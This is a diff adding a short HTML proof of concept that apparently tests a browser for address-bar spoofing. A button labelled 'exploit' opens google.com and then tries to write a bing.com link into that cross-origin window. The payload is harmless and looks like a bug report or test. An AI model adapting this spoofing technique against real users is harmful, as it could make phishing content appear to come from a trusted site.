@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<body>
+<button onclick="spoof()">exploit</button>
+<script>
+function spoof() {
+  let win = window.open(
+    "https://www.google.com",
+    "_blank"
+  );
+
+  setTimeout(() => {
+    try {
+      win.document.write(`
+        <h1>
+          redirect <a href="https://bing.com">bing.com</a>
+        </h1>
+      `);
+    } catch (e) {
+      console.log("Error :", e);
+    }
+  }, 3000);
+}
+</script>
+</body>
+</html>
